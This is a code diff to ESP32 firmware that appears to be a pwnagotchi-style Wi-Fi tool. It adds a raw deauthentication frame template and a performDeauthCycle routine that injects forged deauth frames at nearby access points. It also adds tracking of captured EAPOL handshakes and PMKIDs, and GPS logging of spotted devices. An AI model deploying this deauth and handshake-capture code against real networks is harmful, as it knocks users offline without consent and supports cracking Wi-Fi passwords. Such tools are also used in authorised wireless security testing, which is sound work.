@@ -1,8 +1,16 @@
 #include <Preferences.h>
+#include <freertos/FreeRTOS.h>
 #include <memory>
-#include "pwngrid.h"
+#include "pwn.h"
 #include "identity.h"
 #include "config.h"
+#include "GPSAnalyse.h"
+
+GPSAnalyse GPS;
+float Lat;
+float Lon;
+String Utc;
+bool hasGPS = false;
 
 static const char* NVS_NS = "pwn-stats";
 
@@ -11,7 +19,28 @@ const int away_threshold = 120000;
 unsigned long fullPacketStartTime = 0;
 const unsigned long PACKET_TIMEOUT_MS = 5000; // 5 seconds
 
-int pwngrid_channel = 0;
+portMUX_TYPE gRadioMux = portMUX_INITIALIZER_UNLOCKED;
+
+static QueueHandle_t pktQueue = NULL;
+static QueueHandle_t frQueue = NULL;
+
+static const char* ADJ[] PROGMEM = {
+  "brisk","calm","cheeky","clever","daring","eager","fuzzy","gentle","merry","nimble",
+  "peppy","quirky","sly","spry","steady","swift","tidy","witty","zesty","zen"
+};
+static const char* ANM[] PROGMEM = {
+  "otter","badger","fox","lynx","marten","panda","yak","koala","civet","ibis",
+  "gecko","lemur","heron","tahr","fossa","saola","quokka","magpie","oriole","bongo"
+};
+
+constexpr uint8_t kDeauthFrameTemplate[] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff,
+                                            0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                            0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};
+
+
+std::set<String> known_macs;
+
+Environment env;
 
 uint64_t pwngrid_friends_tot = 0;
 uint64_t pwngrid_friends_run = 0;
@@ -28,36 +57,35 @@ static String identityHex;              // storage stabile
 
 DeviceConfig *config = getConfig();
 
+std::set<BeaconEntry> gRegisteredBeacons;
+
+extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, const void *buffer, int len);
+
 void loadStats() {
-  Preferences p;
-  if (!p.begin(NVS_NS, true)) {
-    Serial.println("Error trying to read stats");
-    return;
-  }
-  pwngrid_friends_tot = p.getLong64("f_tot", 0);
-  pwngrid_pwned_tot  = p.getLong64("p_tot",  0);
+  pwngrid_friends_tot = getFriendsTot();
+  pwngrid_pwned_tot  = getPwnedTot();
 }
 
 void saveStats() {
-  Preferences p;
-  if (!p.begin(NVS_NS, false)) {
-    Serial.println("Error trying to save stats");
-    return;
-  }  
-  p.putLong64("f_tot", pwngrid_friends_tot);
-  p.putLong64("p_tot", pwngrid_pwned_tot);
-  p.end();
-  Serial.println(("Stats saved:"));
-  Serial.println("f_tot:");
-  Serial.println(pwngrid_friends_tot);
-  Serial.println("p_tot:");
-  Serial.println(pwngrid_pwned_tot);
+  setStats(pwngrid_friends_tot, pwngrid_pwned_tot);
 }
 
 // helper: format MAC -> string
 void MAC2str(const uint8_t mac[6], char *out /*18 bytes*/) {
   sprintf(out, "%02x:%02x:%02x:%02x:%02x:%02x",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+}
+
+// Fix esp_wifi_get_channel usage:
+int wifi_get_channel() {
+    uint8_t primary;
+    wifi_second_chan_t second;
+    esp_wifi_get_channel(&primary, &second);
+    return primary;
+}
+
+void wifi_set_channel(int ch) {
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
 }
 
 void dbFriendTask(void *pv) {
@@ -177,7 +205,6 @@ esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len,
 
 esp_err_t pwngridAdvertise(uint8_t channel, String face) {
   //Serial.println("pwngridAdvertise...");
-  pwngrid_channel = channel;
   DynamicJsonDocument pal_json(2048);
   String pal_json_str = "";
 
@@ -199,9 +226,9 @@ esp_err_t pwngridAdvertise(uint8_t channel, String face) {
   pal_json["version"] = PWNGRID_VERSION;
   pal_json["policy"]["advertise"] = true;
   pal_json["policy"]["bond_encounters_factor"] = 20000;
-  pal_json["policy"]["bored_num_epochs"] = 0;
-  pal_json["policy"]["sad_num_epochs"] = 0;
-  pal_json["policy"]["excited_num_epochs"] = 9999;
+  pal_json["policy"]["bored_num_epoch"] = 0;
+  pal_json["policy"]["sad_num_epoch"] = 0;
+  pal_json["policy"]["excited_num_epoch"] = 9999;
 
   serializeJson(pal_json, pal_json_str);
   uint16_t pal_json_len = measureJson(pal_json);
@@ -283,10 +310,17 @@ void pwngridAddPeer(DynamicJsonDocument &json, signed int rssi, int channel) {
   enqueue_friend_from_sniffer(pwngrid_peers[pwngrid_friends_run]);
   pwngrid_friends_run++;
   saveStats();
-}
 
-int getPwngridChannel() {
-  return pwngrid_channel;
+  if (hasGPS) {
+    GPS.upDate();
+    Lat = GPS.s_GNRMC.Latitude;
+    Lon = GPS.s_GNRMC.Longitude;
+    Utc = GPS.s_GNRMC.Utc;
+    Serial.printf("Just spotted %s at:", json["name"].as<String>());
+    Serial.printf("Latitude= %.5f \r\n",Lat);
+    Serial.printf("Longitude= %.5f \r\n",Lon);
+    Serial.printf("DATA= %s \r\n",Utc);
+  }
 }
 
 void checkPwngridGoneFriends() {
@@ -353,6 +387,16 @@ void handlePacket(wifi_promiscuous_pkt_t *snifferPacket) {
   int pkt_len = ppkt->rx_ctrl.sig_len ? ppkt->rx_ctrl.sig_len : 300;  // usa la len reale se disponibile
   int rx_channel = ppkt->rx_ctrl.channel;
 
+  char addr[] = "00:00:00:00:00:00";
+  getMAC(addr, snifferPacket->payload, 10);
+
+  String mac = String(addr);
+  if (known_macs.find(mac) == known_macs.end()) {
+      known_macs.insert(mac);
+      env.new_aps_found++;
+      env.ap_count++;
+  }
+
   bool isEapol = false;
   if (pkt_len > 34) {  // semplice bound check
     if ((pkt[30] == 0x88 && pkt[31] == 0x8e) || (pkt[32] == 0x88 && pkt[33] == 0x8e)) {
@@ -363,6 +407,11 @@ void handlePacket(wifi_promiscuous_pkt_t *snifferPacket) {
   if (isEapol) {
     Serial.println("We have EAPOL");
     drawMood(pwnagotchi_moods[10], "I love EAPOLs!", false, getPwngridLastFriendName(), getPwngridClosestRssi());
+
+    env.eapol_packets++;
+    env.got_handshake = true;
+    env.last_handshake_time = millis();
+    
     pwngrid_pwned_run++;
     pwngrid_pwned_tot++;
     saveStats();
@@ -497,6 +546,7 @@ void handlePacket(wifi_promiscuous_pkt_t *snifferPacket) {
                   memcpy(bssid, addr3, 6);  // fallback
                 }
 
+                env.got_pmkid = true;
                 Serial.print("PMKID #");
                 Serial.print(k);
                 Serial.print(": ");
@@ -601,7 +651,6 @@ void pwnSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
           
           packet.concat(ie_data);
           if (packet.indexOf('{') == 0) {
-              // Start of NEW JSON
               //Serial.println("Start of Advertise packet: " + packet);
               fullPacket = packet;
               fullPacketStartTime = millis();
@@ -659,15 +708,31 @@ const wifi_promiscuous_filter_t filter = {
   .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
 };
 
-void initPwngrid() {
+inline uint8_t readWifiChannel() {
+    uint8_t primary = 1;
+    wifi_second_chan_t second;
+    esp_wifi_get_channel(&primary, &second);
+    return primary;
+}
+
+void initPwning() {
   int rc;
 
-  Serial.println("Init Pwngrid");
+  Serial.println("Init Pwning processes");
+  env.reset();
   loadStats();
   initDB();
   initDBWorkers();
 
-  // ora hai id.name, id.priv_hex, id.pub_hex (se micro-ecc), id.short_id, id.device_mac
+  try {
+    GPS.setSerialPtr(Serial1);
+    GPS.start();
+    hasGPS = true;
+    Serial.println("GPS initialised succesfully.");
+  } catch (...) {
+      Serial.println("Error initialising GPS");
+      hasGPS = false;
+  }
 
   auto id = ensurePwnIdentity(true);
   //Serial.println("Identity: " + id.name + " - short_id: " + id.short_id + " pub_hex: " + id.pub_hex );
@@ -688,3 +753,47 @@ void initPwngrid() {
   delay(1);
   Serial.println("Pwngrid initialised.");
 }
+
+esp_err_t sendRawFrame(wifi_interface_t ifx, const void *frame, int len, const char *tag) {
+    esp_err_t err = esp_wifi_internal_tx(ifx, frame, len);
+    if (err == ESP_ERR_NOT_SUPPORTED || err == ESP_ERR_INVALID_ARG) {
+        Serial.println("Internal TX unsupported; falling back");
+        err = esp_wifi_80211_tx(ifx, frame, len, false);
+    }
+    return err;
+}
+
+void performDeauthCycle() {
+    std::vector<BeaconEntry> snapshot;
+    snapshot.reserve(gRegisteredBeacons.size());
+    portENTER_CRITICAL(&gRadioMux);
+    std::copy(gRegisteredBeacons.begin(), gRegisteredBeacons.end(), std::back_inserter(snapshot));
+    portEXIT_CRITICAL(&gRadioMux);
+
+    if (snapshot.empty()) { return; }
+
+    uint8_t originalChannel = readWifiChannel();
+
+    for (const auto &entry : snapshot) {
+        if (entry.channel != originalChannel) { continue; }
+        uint8_t frame[sizeof(kDeauthFrameTemplate)];
+        memcpy(frame, kDeauthFrameTemplate, sizeof(kDeauthFrameTemplate));
+        memcpy(frame + 10, entry.mac, 6);
+        memcpy(frame + 16, entry.mac, 6);
+
+        esp_wifi_set_channel(entry.channel, WIFI_SECOND_CHAN_NONE);
+        for (int i = 0; i < 3; ++i) {
+            esp_err_t err = sendRawFrame(WIFI_IF_STA, frame, sizeof(frame), "Deauth");
+            if (err != ESP_OK) {
+                Serial.println("Deauth tx failed on STA iface.");
+            }
+        }
+    }
+
+    esp_wifi_set_channel(originalChannel, WIFI_SECOND_CHAN_NONE);
+}
+
+Environment &getEnv() {
+  return env;
+}
+
